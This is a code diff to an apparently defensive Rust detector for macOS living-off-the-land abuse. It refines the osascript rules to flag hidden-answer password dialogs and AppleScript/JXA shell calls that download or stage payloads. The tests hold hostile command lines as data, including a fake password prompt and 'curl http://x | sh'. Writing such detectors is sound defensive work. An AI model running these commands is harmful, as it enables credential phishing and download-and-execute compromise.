@@ -77,13 +77,33 @@ pub const MACOS_LOTL_PATTERNS: &[&str] = &[
     "base64 -d",
     "base64 --decode",
     "b64decode",
-    "osascript -e",
     "launchctl load",
     "chmod +x /tmp/",
     "chmod +x /private/tmp/",
 ];
 
 pub const CURL_PIPE_SHELL: &str = "curl | sh";
+/// A dialog that asks for text and hides what is typed: how Mac stealers phish the login password.
+pub const OSASCRIPT_PASSWORD_PROMPT: &str = "osascript hidden-answer prompt";
+/// AppleScript used to fetch or stage something through the shell.
+pub const OSASCRIPT_SHELL_FETCH: &str = "osascript do shell script fetch";
+
+/// What malware does with inline AppleScript. A bare `osascript -e` is not a signal: launchers,
+/// installers and automation tools run one constantly, and flagging them all hid the real ones.
+fn osascript_abuse(normalized: &str) -> Option<&'static str> {
+    if !normalized.contains("osascript") {
+        return None;
+    }
+    if normalized.contains("hidden answer") {
+        return Some(OSASCRIPT_PASSWORD_PROMPT);
+    }
+    let fetches = ["curl ", "wget ", "base64", "/tmp/", "chmod +x"]
+        .iter()
+        .any(|needle| normalized.contains(needle));
+    // "doshellscript" is the same call from JavaScript for Automation (osascript -l JavaScript).
+    let runs_shell = normalized.contains("do shell script") || normalized.contains("doshellscript");
+    (runs_shell && fetches).then_some(OSASCRIPT_SHELL_FETCH)
+}
 
 /// `curl ... | [sudo] sh|bash|zsh` within one command line (download-and-execute).
 fn curl_piped_to_shell(normalized: &str) -> bool {
@@ -129,6 +149,9 @@ pub fn match_lotl_macos(process_name: &str, cmdline: &str) -> Option<&'static st
         .to_lowercase();
     if curl_piped_to_shell(&normalized) {
         return Some(CURL_PIPE_SHELL);
+    }
+    if let Some(abuse) = osascript_abuse(&normalized) {
+        return Some(abuse);
     }
     MACOS_LOTL_PATTERNS
         .iter()
@@ -613,9 +636,48 @@ mod tests {
             Some("base64 -d")
         );
         assert_eq!(
-            match_lotl_macos("osascript", "osascript -e do shell script \"id\""),
-            Some("osascript -e")
+            match_lotl_macos(
+                "osascript",
+                "osascript -e 'display dialog \"macOS needs your password\" default answer \"\" with hidden answer'"
+            ),
+            Some(OSASCRIPT_PASSWORD_PROMPT)
         );
+        assert_eq!(
+            match_lotl_macos(
+                "osascript",
+                "osascript -e 'do shell script \"curl -s http://x/p -o /tmp/p\"'"
+            ),
+            Some(OSASCRIPT_SHELL_FETCH)
+        );
+        assert_eq!(
+            match_lotl_macos(
+                "osascript",
+                "osascript -l JavaScript -e 'Application.currentApplication().doShellScript(\"curl http://x | sh\")'"
+            ),
+            Some(OSASCRIPT_SHELL_FETCH)
+        );
+        assert_eq!(
+            match_lotl_macos(
+                "osascript",
+                "osascript -l JavaScript -e 'app.doShellScript(\"chmod +x /tmp/a\")'"
+            ),
+            Some(OSASCRIPT_SHELL_FETCH)
+        );
+        // Ordinary automation is not a threat: quitting an app, asking System Events a question,
+        // or a plain shell command with no download in it.
+        for benign in [
+            "osascript -e 'tell application id \"com.thenex.edr\" to quit'",
+            "osascript -e 'tell application \"System Events\" to get name of every process'",
+            "osascript -e 'do shell script \"id\"'",
+            "osascript -e 'display dialog \"Done\"'",
+        ] {
+            assert_eq!(match_lotl_macos("osascript", benign), None, "{benign}");
+            assert_eq!(
+                match_lotl_macos("zsh", &format!("zsh -c {benign}")),
+                None,
+                "{benign}"
+            );
+        }
         assert_eq!(
             match_lotl_macos(
                 "bash",
@@ -678,7 +740,10 @@ mod tests {
                 "certutil -urlcache -split -f http://x/a.exe",
             ),
             ("sh", "sh -c \"curl http://x | sh\""),
-            ("osascript", "osascript -e 'do shell script \"id\"'"),
+            (
+                "osascript",
+                "osascript -e 'do shell script \"curl http://x/a | sh\"'",
+            ),
             ("bash", "bash -c echo aWQ= | base64 -D"),
         ] {
             assert!(
